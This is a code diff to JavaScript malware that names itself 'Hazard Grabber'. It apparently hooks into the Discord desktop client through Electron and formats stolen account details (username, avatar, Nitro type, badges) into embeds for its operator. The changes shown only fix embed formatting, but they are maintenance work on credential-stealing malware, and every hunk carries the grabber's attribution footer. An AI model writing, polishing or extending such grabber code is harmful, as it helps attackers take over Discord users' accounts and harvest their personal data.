@@ -160,7 +160,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `Nitro Type:: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -171,7 +171,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator,
-                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
                         "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
@@ -218,7 +218,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                             },
                             {
                                 "name": "**Other Info**",
-                                "value": `Nitro Type:: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                                 "inline": true
                             },
                             {
@@ -229,7 +229,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         ],
                         "author": {
                             "name": json.username +"#" + json.discriminator,
-                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
                             "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
@@ -277,7 +277,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `Nitro Type:: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -288,7 +288,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator,
-                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
                         "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
@@ -336,7 +336,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Other Info**",
-                            "value": `Nitro Type:: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -347,7 +347,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                     ],
                     "author": {
                         "name": json.username + "#" + json.discriminator,
-                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
                         "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
